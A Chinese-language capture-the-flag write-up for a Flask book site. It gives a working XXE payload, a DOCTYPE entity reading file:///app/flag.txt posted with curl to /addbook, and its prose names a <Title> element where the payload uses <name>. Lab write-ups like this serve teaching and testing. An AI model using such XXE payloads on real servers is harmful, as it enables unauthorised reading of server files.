## 题解

### 入口与指纹

Flask 的图书站，首页 `/` 只是说明，真正的表单在 `POST /addbook`，字段 `xml`
（`application/x-www-form-urlencoded` 的 textarea），成功回
`You have append this book successfully !`。

### 关键观察

- 首页页面上直接贴了示例 XML，并提示「Upload a book in XML format」。
- 提交带外部实体的 XML 仍然返回成功，且实体值没有回显 —— 但把实体放进 `<Title>`
  后，响应里能直接看到文件内容（页面把解析结果的一部分渲染出来）。

### 利用链

```bash
T=$(head -1 .target)
cat > x.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE books [ <!ENTITY xxe SYSTEM "file:///app/flag.txt"> ]>
<library><book><name>&xxe;</name><isbn>1</isbn><author>a</author><publisher>p</publisher></book></library>
XML
curl -sS -X POST --data-urlencode "xml@x.xml" "http://$T/addbook" | grep -o 'flag{[^}]*}'
```

### flag 位置

容器内 `/app/flag.txt`（通过 XXE 读取）。

## 复盘

- 「XML 上传」= 先试 XXE，一次请求就能判定。
- 表单在 `/addbook` 而不是首页；首页只有 textarea 预览。
